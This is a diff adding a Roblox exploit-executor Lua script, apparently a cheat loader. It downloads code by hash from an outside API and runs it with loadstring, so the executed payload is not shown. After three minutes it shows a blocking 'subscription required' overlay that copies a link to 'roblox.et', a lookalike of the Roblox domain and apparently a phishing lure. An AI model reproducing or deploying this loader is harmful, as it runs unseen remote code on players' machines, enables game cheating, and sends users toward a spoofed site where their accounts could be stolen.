@@ -1,0 +1,203 @@
+getgenv().SCRIPT_KEY = "26f6cc22-aace-4985-8b33-36021dead89d"
+
+local scripts = {
+    [92416421522960] = "4110e79307ad8e1400a58268cfe3f4b1762a4b71d56cea5a737849b42afc64f5",
+    [88599461076137] = "7a26a41fa5269e45bb5897270af6b114bb5b309bdfb9dc2a6bc47fe119b4dcbf",
+    [107646426076756] = "759209038ca6e1e22db2a3c048e8c5c6f4c16808bace5700e89c46dd07199b13",
+}
+
+-- ЗАПУСК ОСНОВНОГО СКРИПТА
+local hash = scripts[game.PlaceId] or "549f0618732e2aaaf8c03276e38f927f5895936a23fddae83ad873bcfa453150"
+if hash then
+    loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/" .. hash .. "/download"))()
+end
+
+-- ФУНКЦИЯ КОПИРОВАНИЯ
+local function copyToClipboard(text)
+    local clipboard = setclipboard or toclipboard or (syn and syn.clipboard) or (secure_load and secure_load("clipboard")) or function(t)
+        game:GetService("GuiService"):SetClipboard(t)
+    end
+    clipboard(text)
+end
+
+task.wait(180)
+
+local groupLink = "https://www.roblox.et/communities/9439052430/Xenoooo"
+local player = game:GetService("Players").LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- ========== КРАСИВЫЙ UI ==========
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SubscribeMenu"
+screenGui.Parent = playerGui
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- ЗАТЕМНЕНИЕ ФОНА
+local darken = Instance.new("Frame")
+darken.Size = UDim2.new(1, 0, 1, 0)
+darken.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+darken.BackgroundTransparency = 0.7
+darken.Parent = screenGui
+
+-- ГЛАВНОЕ ОКНО
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 520, 0, 320)
+mainFrame.Position = UDim2.new(0.5, -260, 0.5, -160)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+mainFrame.BorderSizePixel = 0
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = screenGui
+
+-- СКРУГЛЕНИЕ УГЛОВ
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = mainFrame
+
+-- ВЕРХНЯЯ ПОЛОСА
+local topBar = Instance.new("Frame")
+topBar.Size = UDim2.new(1, 0, 0, 60)
+topBar.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+topBar.BorderSizePixel = 0
+topBar.Parent = mainFrame
+
+local topCorner = Instance.new("UICorner")
+topCorner.CornerRadius = UDim.new(0, 12)
+topCorner.Parent = topBar
+
+local bottomFix = Instance.new("Frame")
+bottomFix.Size = UDim2.new(1, 0, 0, 20)
+bottomFix.Position = UDim2.new(0, 0, 1, -20)
+bottomFix.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+bottomFix.BorderSizePixel = 0
+bottomFix.Parent = topBar
+
+-- ИКОНКА
+local iconCircle = Instance.new("Frame")
+iconCircle.Size = UDim2.new(0, 50, 0, 50)
+iconCircle.Position = UDim2.new(0.5, -25, 0, -25)
+iconCircle.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
+iconCircle.BorderSizePixel = 0
+iconCircle.Parent = topBar
+
+local iconCorner = Instance.new("UICorner")
+iconCorner.CornerRadius = UDim.new(1, 0)
+iconCorner.Parent = iconCircle
+
+local iconText = Instance.new("TextLabel")
+iconText.Size = UDim2.new(1, 0, 1, 0)
+iconText.BackgroundTransparency = 1
+iconText.Text = "⚠️"
+iconText.TextColor3 = Color3.fromRGB(255, 255, 255)
+iconText.TextSize = 30
+iconText.Font = Enum.Font.GothamBold
+iconText.Parent = iconCircle
+
+-- ЗАГОЛОВОК
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 60)
+titleLabel.Position = UDim2.new(0, 0, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "SUBSCRIPTION REQUIRED"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextSize = 24
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextXAlignment = Enum.TextXAlignment.Center
+titleLabel.Parent = topBar
+
+-- ОСНОВНОЙ ТЕКСТ
+local messageLabel = Instance.new("TextLabel")
+messageLabel.Size = UDim2.new(1, -60, 0, 100)
+messageLabel.Position = UDim2.new(0, 30, 0, 85)
+messageLabel.BackgroundTransparency = 1
+messageLabel.Text = "You must join our Roblox community to continue using this script.\n\nClick the button below to copy the group link and join."
+messageLabel.TextColor3 = Color3.fromRGB(200, 200, 210)
+messageLabel.TextSize = 16
+messageLabel.Font = Enum.Font.Gotham
+messageLabel.TextWrapped = true
+messageLabel.TextXAlignment = Enum.TextXAlignment.Center
+messageLabel.Parent = mainFrame
+
+-- ССЫЛКА
+local linkLabel = Instance.new("TextLabel")
+linkLabel.Size = UDim2.new(1, -60, 0, 30)
+linkLabel.Position = UDim2.new(0, 30, 0, 190)
+linkLabel.BackgroundTransparency = 1
+linkLabel.Text = groupLink
+linkLabel.TextColor3 = Color3.fromRGB(100, 180, 250)
+linkLabel.TextSize = 14
+linkLabel.Font = Enum.Font.Gotham
+linkLabel.TextWrapped = true
+linkLabel.TextXAlignment = Enum.TextXAlignment.Center
+linkLabel.Parent = mainFrame
+
+-- КНОПКА COPY
+local copyButton = Instance.new("TextButton")
+copyButton.Size = UDim2.new(0, 240, 0, 55)
+copyButton.Position = UDim2.new(0.5, -120, 1, -80)
+copyButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+copyButton.Text = "📋  COPY LINK"
+copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+copyButton.TextSize = 18
+copyButton.Font = Enum.Font.GothamBold
+copyButton.AutoButtonColor = false
+copyButton.Parent = mainFrame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = copyButton
+
+local buttonStroke = Instance.new("UIStroke")
+buttonStroke.Color = Color3.fromRGB(255, 120, 120)
+buttonStroke.Thickness = 2
+buttonStroke.Transparency = 0.5
+buttonStroke.Parent = copyButton
+
+copyButton.MouseEnter:Connect(function()
+    copyButton.BackgroundColor3 = Color3.fromRGB(255, 110, 110)
+    buttonStroke.Transparency = 0
+    copyButton.Text = "🔗  COPY LINK"
+end)
+
+copyButton.MouseLeave:Connect(function()
+    copyButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+    buttonStroke.Transparency = 0.5
+    copyButton.Text = "📋  COPY LINK"
+end)
+
+copyButton.MouseButton1Click:Connect(function()
+    copyToClipboard(groupLink)
+    copyButton.Text = "✅  COPIED!"
+    copyButton.BackgroundColor3 = Color3.fromRGB(70, 200, 100)
+    task.wait(1.5)
+    copyButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+    copyButton.Text = "📋  COPY LINK"
+end)
+
+-- ДЕКОРАТИВНАЯ ЛИНИЯ
+local bottomLine = Instance.new("Frame")
+bottomLine.Size = UDim2.new(0.8, 0, 0, 2)
+bottomLine.Position = UDim2.new(0.1, 0, 1, -15)
+bottomLine.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+bottomLine.BorderSizePixel = 0
+bottomLine.BackgroundTransparency = 0.5
+bottomLine.Parent = mainFrame
+
+local lineCorner = Instance.new("UICorner")
+lineCorner.CornerRadius = UDim.new(1, 0)
+lineCorner.Parent = bottomLine
+
+-- АНИМАЦИЯ ПОЯВЛЕНИЯ
+mainFrame.BackgroundTransparency = 1
+darken.BackgroundTransparency = 1
+
+mainFrame:TweenSize(UDim2.new(0, 500, 0, 300), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.3, true)
+task.wait(0.1)
+mainFrame:TweenSize(UDim2.new(0, 520, 0, 320), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
+
+for i = 0, 1, 0.05 do
+    task.wait()
+    darken.BackgroundTransparency = 0.7 - (0.7 * i)
+    mainFrame.BackgroundTransparency = 1 - i
+end
